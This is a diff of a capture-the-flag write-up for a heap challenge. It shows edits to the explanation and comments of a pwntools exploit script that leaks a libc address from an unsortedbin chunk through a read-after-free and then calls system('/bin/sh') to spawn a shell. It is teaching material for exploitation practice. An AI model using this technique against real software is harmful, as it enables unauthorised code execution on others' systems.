@@ -54,7 +54,7 @@ During debugging, I observed that selecting option 42, ``¿?¿?¿?¿?¿?¿?``, t
 
 ## Exploitation phase
 
-Since there aren't any useful functions to execute within the ``ELF`` file, our objective is to somehow leak the ``libc`` address. In heap challenges, it's common to achieve this by reading metadata from an ``unsortedbin`` chunk. With the ``read-after-free`` bug we've identified, creating an ``unsortedbin`` chunk and then reading its data using the ``show`` function allows us to leak the unsortedbin address in libc, from which we can calculate the base address of libc. Finally, we use the arbitrary code execution bug to call ``system(/bin/sh)`` and spawn a shell.
+Since there aren't any useful functions to execute within the ``ELF`` file, our objective is to somehow leak the ``libc`` address. In heap challenges, it's common to achieve this by reading metadata from an ``unsortedbin`` chunk,  and it is possible with the ``read-after-free`` bug we have at hand, we only need to create an `unsortedbin` chunk and read its data with the `show` function to leak the unsortedbin address in libc and calculate the libc base address with it. Finally, we can use the arbitrary code execution bug to call ``system(/bin/sh)`` and spawn a shell.
 
 This summarizes the approach outlined in the following exploit script.
 
@@ -111,7 +111,7 @@ io = start()
 #                    EXPLOIT GOES HERE
 #============================================================
 
-# Fill the 0x90 tcache to get a 0x90 unsortedbin
+# Allocate all necessary chunks
 malloc(128, 0, b"A")
 malloc(128, 1, b"A")
 malloc(128, 2, b"A")
@@ -122,6 +122,8 @@ malloc(128, 6, b"A")
 malloc(128, 7, b"A")
 malloc(128, 8, b"A") # Guard against consolidation with the top chunk
 
+# Fill the tcache bin of size 0x90 to ensure the next 0x90 chunk allocation 
+# goes into the unsortedbin.
 free(0) # 0x90 tcache 1
 free(1) # 0x90 tcache 2
 free(2) # 0x90 tcache 3
@@ -131,25 +133,26 @@ free(5) # 0x90 tcache 6
 free(6) # 0x90 tcache 7
 free(7) # unsortedbin
 
-# Leak libc address from the unsortedbin
+# Leak the unsortedbin address which is in libc
 data = read(7)
 
-# Calculate libc address
+# Calculate libc address by substracting the leaked unsortedbin address
+# with its offset in libc
 libc.address = u64(data[:6] + b"\x00\x00") - 0x21ace0
 info("libc @ 0x%x", libc.address)
 
-# Call system(/bin/sh)
+# Setting up the parameters to call system(/bin/sh)
 system = hex(libc.sym.system)
 malloc(128, 0, f"{system}")
 malloc(128, 1, "/bin/sh\0")
 
+# Call system(/bin/sh) with the 42 program option
 call()
 
 #============================================================
 
 # Interact with the process
 io.interactive()
-
 ```
 
 ```
